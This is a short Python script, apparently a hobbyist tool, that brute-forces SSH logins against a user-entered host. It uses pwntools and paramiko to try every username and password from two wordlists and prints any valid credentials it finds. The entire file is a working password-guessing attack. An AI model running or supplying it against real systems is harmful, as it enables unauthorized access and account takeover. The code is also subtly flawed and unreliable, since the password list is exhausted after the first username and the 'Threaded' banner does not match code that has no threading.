# Import required modules
from pwn import *
import paramiko

# Get the target hostname from the user
host = input("Hostname : ")	

# Initialization of the attempt counter
attempts = 0


# Print a blank line
print()
print()

# Print a message indicating the start of the SSH bruteforce process
print('-'*8 +'Starting Threaded SSH Bruteforce On ' + host +' '+8*'-')


# Print a blank line
print()

# Open the users.txt file containing a list of usernames
with open("Wordlists/users.txt", "r") as users_list:

	# Open the userpass.txt file containing a list of passwords
	with open("Wordlists/userpass.txt", "r") as password_list: 

		# Loop through each username from users.txt
		for user in users_list:
			user = user.strip("\n")

			# Loop through each password from userpass.txt
			for password in password_list:
				password = password.strip("\n")
				try: 

					# Attempt SSH login with the current username and password
					print("[{}] Attempting user: '{}' ==> password: '{}'!".format(attempts, user, password))
					response = ssh (host=host, user=user, password=password, timeout=1)
					if response.connected(): 

						# Valid login found, print the credentials and break the loop
						print("[==>] Valid login found. Username : '{}' ; Password : '{}'!".format(user, password), 'green')
						response.close() 
						break
					response.close()
				except paramiko.ssh_exception.AuthenticationException: 

					# Invalid login, continue with the next set of credentials
					print("[XXX] Invalid login!")
				attempts += 1

#writed by gh05t https://www.linkedin.com/in/eddie-gbaguidi-208b87242
